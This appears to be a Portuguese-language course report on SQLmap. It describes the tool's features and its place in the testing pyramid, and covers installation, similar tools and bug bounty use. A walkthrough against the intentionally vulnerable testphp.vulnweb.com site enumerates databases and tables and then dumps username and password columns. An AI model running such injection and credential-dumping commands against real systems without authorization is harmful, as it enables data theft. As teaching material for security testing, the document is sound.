# SQLmap
Matheus Antônio de Castro de Barros, 2025.1

## Introdução

### O que é o SQLmap

SQLmap automatiza todas as fases do ataque: descoberta do ponto vulnerável, enumeração do banco, extração de dados, escrita/leitura de arquivos e até execução de comandos no sistema operacional via canais fora-de-banda. 

### Onde ele se encaixa na Pirâmide de Automação

Na pirâmide clássica (Unidade → Integração/Serviço → UI/E2E), SQLmap opera no **terceiro nível**. Ele testa a aplicação já implantada, exercitando a camada HTTP/REST (black-box), portanto fica no mesmo degrau dos testes End-to-End (E2E) ou DAST.

## Principais Funcionalidades

| Categoria                  | Recursos destacáveis                                                                                                                                                       |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Detecção & Exploração**  | 6 técnicas de injeção (boolean-, time-, error-based, UNION, stacked queries, OOB), auto-discernimento de DBMS, heurísticas ajustáveis.  |
| **Pós-exploração**         | Dump completo de tabelas, brute-force de senhas HASH, *pivoting* para execução de comandos OS, leitura/gravação de arquivos.                              |
| **Bypass & Evasão**        | 50+ *tamper scripts* para escapar de WAF, proxy encadeado, randomização do *User-Agent*.                                                                |
| **Suporte a banco**        | MySQL/MariaDB, PostgreSQL, Oracle, SQL Server, SQLite, DB2, SAP HANA, Snowflake, DM8 e outros.                                                            |
| **Automação & Integração** | Modo não-interativo (`--batch`), saída em JSON/CSV, *GitHub Action* oficial, fácil chamada via scripts Shell, Makefile, Jenkinsfile ou GitHub Actions.    |

**Tipos de teste** – SQLmap faz **caixa-preta** (DAST); se você tiver o código-fonte ou *request* gravado no Burp, pode simular **caixa-cinza**. Não há instrumentação para **caixa-branca**. 

**Integrações** – Use a *action-sqlmap* em GitHub Actions, jobs no Jenkins, ou chame o binário em pipelines GitLab. Em test suites Java, resultados JSON podem ser lidos por JUnit para reprovar o build. Navegadores e Burp/OWASP ZAP exportam requests em formato compatível (`-r`). 

## Demonstração

Este guia apresenta um passo a passo direto para instalar o SQLMap e executar um scan de enumeração completo em um alvo de teste.

### Pré-requisitos
* Ambiente Linux (Ubuntu, WSL, Kali, etc.).
* Acesso `sudo`.
* `git` e `python3` instalados.

---

### Instalação e Configuração Rápida

**Baixar via Git**

Crie um diretório `tools` e clone o repositório oficial do SQLMap.

```bash
mkdir -p ~/tools
cd ~/tools
git clone --depth 1 [https://github.com/sqlmapproject/sqlmap.git](https://github.com/sqlmapproject/sqlmap.git) sqlmap-dev
```
### Tornar Executável e Criar Link Simbólico

Permita a execução do script e crie um atalho global para o comando **sqlmap**.

```bash
# Navegue até o diretório
cd sqlmap-dev

# Adicione permissão de execução
chmod +x sqlmap.py

# Crie o link simbólico para acesso global
sudo ln -s ~/tools/sqlmap-dev/sqlmap.py /usr/local/bin/sqlmap
```

### Verificar Instalação

Execute o comando de **ajuda** para confirmar que tudo está funcionando.

```bash
sqlmap -h
```

### Exploração Passo a Passo
**Alvo:** http://testphp.vulnweb.com/listproducts.php?cat=1

**Passo 1: Listar Bancos de Dados** (`--dbs`)

Execute o scan inicial para confirmar a vulnerabilidade e listar os **bancos de dados**.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --batch
```
`--batch`: Usa as respostas padrão para todas as perguntas interativas.

**Saída Esperada:**
```
available databases [2]:
[*] acuart
[*] information_schema
```

**Passo 2: Listar Tabelas** (`-D` e `--tables`)

Foque no banco de dados **acuart** e liste suas **tabelas**.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables --batch
```
**Saída Esperada:**
```
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```

**Passo 3: Listar Colunas** (`-T` e `--columns`)

Investigue as **colunas** da tabela **users**.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns --batch
```
**Saída Esperada:**
```
Database: acuart
Table: users
[8 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| address  | text        |
| ...      | ...         |
| pass     | varchar(50) |
| uname    | varchar(50) |
+----------+-------------+
```

**Passo 4: Extrair Dados** (`-C` e `--dump`)

Extraia o conteúdo das colunas **uname** e **pass** da tabela **users**.

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C "uname,pass" --dump --batch
```
**Saída Esperada:**
```
Database: acuart
Table: users
[1 entries]
+-------+-------+
| uname | pass  |
+-------+-------+
| test  | test  |
+-------+-------+
```

## Frameworks Similares

| Ferramenta                   | Observações                                                                                                                 |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| **jSQL Injection**           | GUI Java, automatiza SQLi em Windows/Mac/Linux.                                                 |
| **Sqlninja**                 | Foca em SQLi no SQL Server, com *priv-escalation* em Windows.                                   |
| **NoSQLMap**                 | Versão voltada a MongoDB/Couch.                                                                 |
| **Havij (comercial)**        | Interface amigável, atualização lenta, suporte limitado a SGBDs recentes.                                                   |
| **OWASP ZAP / Burp Scanner** | Fazem varredura DAST mais ampla (XSS, SSRF etc.) e também SQLi, porém não tão profundos quanto SQLmap.  |

## Vantagens e Desvantagens

| Aspecto          | Pontos Positivos                                                                                                          | Pontos a Observar                                                        |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| **Técnico**      | Cobertura de técnicas, suporte a muitos bancos, *tamper scripts* prontos.                                | Pode gerar ruído em logs; payloads agressivos podem derrubar app frágil. |
| **Maturidade**   | Projeto ativo desde 2006, centenas de *commits*/ano.                                                     | Mudanças em DBMS exóticos podem levar semanas até entrar no master.      |
| **Aprendizado**  | Curva inicial curta (`-u URL --dump` já funciona). Cheat-sheets abundantes.                            | Opções avançadas (>120 flags) exigem estudo/refino.                      |
| **Documentação** | Wiki + PDF manual de 100 páginas + cursos HTB Academy.  | Falta guia oficial de integração CI/CD; depende da comunidade.           |
| **Performance**  | Threads paralelas, heurísticas adaptativas.                                                              | Scans completos podem ser lentos em *blind* SQLi (sleep).                |

## Casos de Uso de Sucesso

* **Bug Bounty** – Pesquisadores reportam vulnerabilidades confirmadas com SQLmap em programas do *U.S. Department of Defense* (HackerOne #2597543). ([hackerone.com][16])
* **Bug bounty** – Relato no Medium mostra como SQLmap permitiu explorar SQLi *time-based* e extrair dados, rendendo a recompensa. ([medium.com][17])
* **Caça em escala** – Estratégia automatizada usando FFUF + SQLmap achou múltiplos SQLi em minutos, gerando vários relatórios válidos. ([infosecwriteups.com][18])

Esses exemplos demonstram confiança da comunidade *bug bounty* na ferramenta.

## Conclusão

**Quando usar**

* Excelente para **testes de segurança dinâmicos** em APIs e sites antes de ir para produção ou durante *bug bounty*.
* Útil em **CI/CD**: rode em branch de *merge request* para garantir que novas rotas não introduzam SQLi.

**Quando evitar**

* Em aplicações críticas em produção sem ambiente de staging; cargas de teste podem causar DoS.
* Quando o objetivo é **educar devs** sobre vetores específicos: ferramentas SAST (Semgrep, SonarQube) são mais didáticas no contexto de código.

**Veredito** – SQLmap oferece profundidade inigualável em SQLi e continua evoluindo; para equipes que já cobrem unit e integração, ele fecha a pirâmide com um teste E2E de alto valor. Adote-o junto a WAF, SAST e validação de entrada para uma defesa em camadas.
